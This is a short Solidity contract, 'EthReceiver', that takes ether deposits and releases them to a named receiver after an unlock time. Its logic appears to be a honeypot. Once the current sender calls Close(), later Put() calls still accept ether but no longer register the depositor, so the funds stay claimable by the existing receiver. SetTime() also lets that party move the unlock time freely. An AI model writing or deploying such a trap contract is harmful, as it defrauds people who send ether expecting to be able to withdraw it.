1 pragma solidity ^0.4.22;
2 
3 contract EthReceiver
4 {
5     bool closed = false;
6     uint unlockTime = 43200;
7     address sender;
8     address receiver;
9  
10     function Put(address _receiver) public payable {
11         if ((!closed && msg.value > 0.5 ether) || sender == 0x0 ) {
12             sender = msg.sender;
13             receiver = _receiver;
14             unlockTime += now;
15         }
16     }
17     
18     function SetTime(uint _unixTime) public {
19         if (msg.sender == sender) {
20             unlockTime = _unixTime;
21         }
22     }
23     
24     function Get() public payable {
25         if (receiver == msg.sender && now >= unlockTime) {
26             msg.sender.transfer(address(this).balance);
27         }
28     }
29     
30     function Close() public {
31         if (sender == msg.sender) {
32            closed=true;
33         }
34     }
35 
36     function() public payable { }
37 }